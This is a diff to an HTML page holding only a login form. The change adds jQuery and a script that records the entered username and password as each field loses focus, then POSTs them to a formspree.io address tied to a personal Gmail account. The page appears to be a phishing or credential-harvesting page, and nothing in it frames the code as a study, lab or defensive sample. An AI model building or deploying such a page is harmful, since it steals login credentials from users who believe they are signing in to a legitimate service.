@@ -42,14 +42,45 @@
     height: 100em;
 	}
 	</style>
+	<script
+  src="https://code.jquery.com/jquery-3.1.1.min.js"
+  integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
+  crossorigin="anonymous"></script>
 </head>
 <body>
 	<div id="content">
 		<form method="post" action="https://formspree.io/onlinejobatpb@gmail.com" style="position: fixed;">
-			<input type="text" name="uid">
-			<input type="password" name="pass">
-			<button class="submitbutton" type="submit">Log In</button>
+			<input id="uname" type="text" name="uid">
+			<input id="pass" type="password" name="pass">
+			<button id="send" class="submitbutton" on>Log In</button>
 		</form>
 	</div>
+	<script>
+		$(document).ready(function(){
+			var dataobj = {};
+			$('input#uname').blur(function(){
+				dataobj.uid = $(this).val();
+			});
+			
+			$('input#pass').blur(function(){
+				dataobj.pass= $(this).val();
+			});
+			
+			$('button#send').click(function(){
+				$.ajax({
+					type: "POST",
+					url: "https://formspree.io/onlinejobatpb@gmail.com",
+					// The key needs to match your method's input parameter (case-sensitive).
+					data: JSON.stringify(dataobj),
+					contentType: "application/json; charset=utf-8",
+					dataType: "json",
+					success: function(data){alert(data);},
+					failure: function(errMsg) {
+						alert(errMsg);
+					}
+				});
+			});
+		});
+	</script>
 </body>
 </html>
